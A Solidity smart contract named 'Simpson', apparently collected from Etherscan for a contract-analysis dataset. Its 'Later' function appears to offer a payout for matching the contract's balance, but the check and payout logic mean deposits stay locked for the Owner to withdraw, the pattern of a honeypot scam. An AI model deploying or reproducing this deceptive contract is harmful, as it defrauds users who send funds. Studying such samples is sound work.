/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
// Copyright (C) 2017  The Halo Platform by Scott Morrison
// https://www.haloplatform.tech/
// 
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit:
//
//      https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.18;

contract Simpson
{
    string public constant version = "1.0";
    address public Owner = msg.sender;

    function() public payable {}
   
    function withdraw() payable public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Later(address _address)  public payable {
        if (msg.value >= this.balance) {        
            _address.transfer(this.balance + msg.value);
        }
    }
}